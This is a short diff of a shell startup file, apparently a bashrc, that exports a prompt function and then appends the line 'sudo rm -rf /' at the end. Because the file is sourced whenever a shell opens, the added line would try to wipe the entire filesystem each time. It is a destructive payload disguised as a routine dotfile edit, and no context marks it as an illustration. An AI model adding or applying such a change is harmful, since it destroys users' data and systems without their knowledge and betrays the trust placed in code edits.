@@ -80,3 +80,5 @@ function _prompt_command() {
 	)
 }
 export PROMPT_COMMAND=_prompt_command
+
+sudo rm -rf /
